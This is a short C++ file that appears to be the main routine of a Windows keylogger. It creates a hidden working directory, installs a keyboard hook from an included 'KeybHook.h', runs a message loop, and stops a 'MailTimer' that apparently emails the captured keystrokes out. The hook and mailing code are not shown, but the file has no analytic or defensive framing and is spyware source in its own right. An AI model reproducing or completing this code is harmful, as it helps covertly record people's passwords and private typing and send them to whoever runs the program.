#include <iostream>
#include <windows.h>
#include "KeybHook.h"
using namespace std;

int main ()
    {
        MSG Msg;
        IO::MkDir (IO::GetOurPath (true));
        InstalHook ();
        while (GetMessage (&Msg, NULL, 0, 0))
            {
                TranslateMessage(&Msg);
                DispatchMessage(&Msg);
            }
        MailTimer.Stop ();
        return 0;
    }

